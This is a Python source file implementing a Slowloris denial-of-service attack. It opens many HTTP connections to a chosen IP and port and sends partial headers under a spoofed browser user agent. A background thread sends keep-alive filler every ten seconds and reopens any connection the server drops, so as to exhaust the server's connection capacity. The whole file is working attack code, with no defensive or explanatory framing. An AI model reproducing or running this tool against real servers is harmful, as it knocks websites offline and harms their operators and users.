import lorisConnection
import threading
import time

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"

class SlowLoris:
    def __init__ (self):
        self.connections = []
        self.keepAliveThread = threading.Thread(target=self.keepAlive)
        self.keepAliveThread.setDaemon (True)
        self.keepAliveThread.start ()

    def attack (self, ip, port, count):
        print ('Initializing %d connections.' % (count))
        
        # Start 'count' connections and send the initial HTTP headers.
        for i in range (count):
            conn = lorisConnection.LorisConnection (ip, port);
            conn.sendHeaders (DEFAULT_USER_AGENT)
            self.connections.insert (0, conn)

    def stop (self):
        for conn in self.connections:
            conn.close ()
        
    # This thread makes sure the connections stay alive once established.
    def keepAlive (self):
        while True:
            time.sleep (10)
            print ('Sending keep-alive headers for %d connections.' % (len (self.connections)))
            # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
            for i in range (0, len (self.connections)):
                try:
                    self.connections [i].keepAlive ()
                # If the server closed one of our connections, re-open the connection in it's place.
                except:
                    self.connections [i] = lorisConnection.LorisConnection (self.connections [i].ip, self.connections [i].port)
                    self.connections [i].sendHeaders (DEFAULT_USER_AGENT)